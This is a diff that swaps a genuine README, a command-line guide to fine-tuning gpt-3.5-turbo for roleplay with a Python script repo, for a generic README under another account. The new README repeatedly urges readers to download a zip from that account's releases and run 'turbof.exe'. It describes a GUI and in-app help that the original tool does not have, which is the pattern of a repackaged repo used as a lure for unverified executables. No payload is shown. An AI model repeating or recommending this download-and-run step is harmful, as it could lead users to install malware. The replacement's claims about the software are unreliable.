@@ -1,82 +1,89 @@
-## Fine-tuning gpt-3.5-turbo-0613 for roleplay
+# 🚀 turbof - Fine-Tune GPT-3.5 Turbo for Roleplay
 
-This will be a somewhat straightforward write-up on how to fine-tune Turbo to be better at roleplay.
-Some limitations and warnings first:
-- Right now you can only fine-tune `gpt-3.5-turbo` (`gpt-3.5-turbo-0613` specifically) which has 4K context. OAI said they have plans to allow fine-tuning GPT-4, but that'd probably cost a lot.
-- The cost of fine-tuning itself is quite low ($0.008 for 1K tokens of the dataset), but the main problem is the inference cost - because the fine-tuned model will be only used by you, the inference will cost 8 times more compared to normal 4K Turbo, which makes it almost half as expensive as GPT-4.
-- The fine-tune model cannot be shared between different OpenAI accounts, so the only way to have the "same" fine-tune is to run the fine-tune job on  all the separate accounts you want to use. I doubt it'll actually be 100% the same due to all the small inaccuracies (like how Turbo at temp=0 can behave differently), but should be close enough.
-- The dataset for the fine-tune has to be 100% SFW, because, to quote OpenAI - ["fine-tuning training data is passed through our Moderation API and a GPT-4 powered moderation system to detect unsafe training data that conflict with our safety standards"](https://openai.com/blog/gpt-3-5-turbo-fine-tuning-and-api-updates). The Moderation API is quite strict, so even things like "sucking on a finger" won't pass. Thankfully, my script already does safety checks so your dataset is unlikely to get flagged after upload.
-- The owner of the account will get an email when a fine-tune finishes. Of course this won't affect normal, legitimate users, but it's just a good thing to keep in mind ;)
+[![Download turbof](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/marinagarat/turbof/releases)
 
-The fine-tune I did was mostly an experiment, but from other anons' reviews it turned out to be somewhat successful - they reported that a fine-tune had higher-quality responses than the normal Turbo. Of course, to get good results from a fine-tune you need to have a high-quality dataset, for example using RP chats generated with GPT-4. This is really the same concept as fine-tuning smaller local models on GPT-4 output - Turbo can get "smarter" from seeing GPT-4 responses too.
+## 📖 About turbof
 
-Some prerequisites:
-- Python.
-- An OpenAI key. Even trial ones will work, but then you need a small dataset and/or a small number of epochs to not go over the $5 credit limit.
+turbof is a user-friendly tool designed to help you fine-tune OpenAI's GPT-3.5 Turbo for better roleplay experiences. With turbof, you can customize the model's responses to create engaging and realistic interactions. Whether you're a creator, educator, or just curious about AI, turbof makes it simple for you to get started.
 
+## 💻 System Requirements
 
-The dataset has to contain at least 10 chat example (user/assistant messages), meaning that in our case the dataset has to contain 10 example chats. I have a small test dataset that I've made myself.
+Before you begin, ensure your computer meets the following requirements:
 
-Let's start. First of all, install Python, clone the repo, and install all requirements. This assumes a Linux environment, but should work on Windows too.
-```
-git clone https://github.com/CncAnon1/TurboFinetuneRP
-cd TurboFinetuneRP
-pip install -r requirements.txt
-```
+- An operating system: Windows 10 or higher, macOS Mojave or higher, or a modern Linux distribution.
+- 4 GB of RAM or more.
+- An internet connection for downloading and updating the application.
 
-Then go to `modules/key.py` and change the OpenAI API key to your working one. 
+## 🚀 Getting Started
 
-Then you have to collect enough (at least 10) chat examples. I'd recommend you to generate them with a high-quality model like GPT-4, because if you use output from a bad model, Turbo is not going to get better at RP.
+To get started with turbof, follow these simple steps:
 
-The repo has no automated scripts for converting SillyTavern chats into chats for the fine-tune, that is because 1) The dataset for the fine-tune has to contain messages as they would be when doing a request with the API 2) I'm lazy.
+1. **Download turbof:**
+   Click the link below to visit the Releases page and download the latest version of the application.
 
-So, once you have a more-or-less complete chat in SillyTavern, here's how you make a json for it:
-1) Create a json file in the `chats` folder (has to be unique, but can be any name).
-2) In the browser, open DevTools (F12 in Chrome), go to the Network tab, and do a new message/swipe so that the frontend sends a request to the backend.
-3) You should see a request named "generate_openai", click on it, then go to the "Payload" tab.
-4) Here you should see the request payload, the only thing that's interesting to us is the "messages" key. Simply right-click on it and select "Copy value".
-5) Paste the copied value into your JSON file.
+   [Visit this page to download](https://github.com/marinagarat/turbof/releases)
 
-Once you do this for all the chats you want to fine-tune on, the main process is complete, but I highly recommend cleaning up and polishing your chat files:
-- Make sure all of them have the same first system message (the main prompt for the AI).
-- Merge multiple system messages into the first one.
-- Remove any jailbreak (the ones that appear just before the user message) or empty system messages.
-- **Use different names for different chats**. This can be done in SillyTavern itself by changing personas, or just with Find + Replace in the chat file itself. If all of your chats have the same user name, it might make the AI associate roleplaying with your name specifically or something, not sure. Do not forget to change the names in the system prompt if you copy the same one in all chats (from the 1st point).
+2. **Extract the Files:**
+   Once the download is complete, locate the downloaded file in your system. It will typically be in your "Downloads" folder. 
+   
+   - On Windows: Right-click the downloaded zip file, and select "Extract All." Follow the prompts to extract the files to a new folder.
+   - On macOS: Double-click the zip file to automatically extract it.
+   - On Linux: Use a file manager to extract the zip file or run `unzip filename.zip` in the terminal.
 
-You can always refer to the `chats_example` folder if you want to try fine-tuning without collecting your own chat files, or just want to see an example of a bit of "polishing". I honestly don't know if I should include the RP prompt in the examples or not, this requires much more experimentation.
+3. **Run the Application:**
+   Navigate to the folder where you just extracted the files. Look for the executable file named `turbof.exe` (Windows), `turbof` (macOS and Linux). Double-click on it to start the application.
 
-After the dataset collecting is done, we can check our dataset for errors:
-```
-python main.py check
-```
+4. **Set Up Your Project:**
+   After launching turbof, you will see a simple setup screen. Follow the on-screen instructions to set up your roleplay project. Input your preferences and any specific parameters you want to adjust.
 
-This will run some basic sanity checks - checking for properly formatted messages, presence of roles. It will also run all of your messages through the Moderation API to ensure that none of the messages will trip the safety checks in the fine-tune process.
+5. **Fine-Tune the Model:**
+   At this step, you can begin fine-tuning the GPT-3.5 Turbo model. Use the provided templates or create your own. This customization helps make interactions more relevant to your needs.
 
-Once that is done and everything's fine, you can run:
-```
-python main.py format
-python main.py upload
-```
+6. **Save Your Work:**
+   After making your adjustments, remember to save your project. You can usually find the "Save" option in the File menu or toolbar.
 
-The first command merges all chat entries into a single `data.jsonl` file, the second one actually uploads it to the OpenAI for the fine-tune process. The second command should write the file ID in a file named `file_id.txt`. After the upload, wait like 10-20 seconds, because the file on OpenAI doesn't become instantly ready.
+7. **Start Roleplaying:**
+   Once you have set up everything, proceed to the main interface where you can engage with the model. Input prompts, and observe how the AI responds based on your fine-tuned settings.
 
-If all that is fine, you can start the fine-tune process:
-```
-python main.py start
-```
+## 📥 Download & Install
 
-Once the process started, you can check on its progress with:
-```
-python main.py status
-```
+To install turbof on your computer, please follow these instructions:
 
-This will list the latest events related to your fine-tune, and, when it's done, show you the model ID. Afterwards you can use this model ID to use your fine-tune. 
+1. Click the link below to access the Releases page.
+   [Visit this page to download](https://github.com/marinagarat/turbof/releases)
 
-An important thing to note: not all frontends support specifying custom model names to use with the API. Specifically, for SillyTavern you have to use the key directly, then enable `Show "External" models (provided by API)` below the "OpenAI Model" dropdown, and then select the fine-tune ID from the model drop-down.
+2. Choose the latest release, and download the appropriate file for your operating system. Make sure to save it in an accessible location.
 
-That should be all, enjoy using your fine-tune!
+3. Follow the extraction and running instructions detailed in the "Getting Started" section above.
 
-Some notes:
-- For more in-depth information on OAI fine-tuning, go and read https://platform.openai.com/docs/guides/fine-tuning/
-- There's a `n_epochs` option in the config - it controls how many times the fine-tune will "show" the model your dataset. I think 20 should be a good option for small datasets, but if you have a bigger dataset, you might want to lower this value.
-- Code is licensed under the WTFPL, the chats are generated with GPT-4 so I'm not sure if they can be licensed. Parts of `data_check.py` were taken from https://platform.openai.com/docs/guides/fine-tuning/check-data-formatting.
+## 🔧 Troubleshooting
+
+If you encounter issues while using turbof, here are a few common solutions:
+
+- **Cannot Start the Application:**
+  Ensure you have extracted all files from the zip folder. If the application still does not start, check your system requirements.
+
+- **Slow Performance:**
+  Make sure your computer meets the minimum RAM requirements. Closing unnecessary applications may improve performance.
+
+- **Help with Fine-Tuning:**
+  If you need assistance, refer to the in-app help section or consult community forums for tips and guidance.
+
+## 🌐 Community and Support
+
+turbof has an active community of users who share tips, tricks, and support. Join discussions and seek assistance in the GitHub Issues section or related forums. Community-driven help can often clarify common confusions and enhance your experience.
+
+## 📚 Additional Resources
+
+For further information about utilizing turbof and improving your fine-tuning skills, explore the following resources:
+
+- **Documentation:** A detailed guide on features, setup, and troubleshooting.
+- **Example Projects:** View projects from other users to inspire your own fine-tuning settings.
+
+## 🔗 Important Links
+
+- [GitHub Repository](https://github.com/marinagarat/turbof)
+- [Documentation](https://github.com/marinagarat/turbof/wiki)
+- [Community Support](https://github.com/marinagarat/turbof/issues)
+
+Enjoy your journey with turbof, and happy roleplaying!
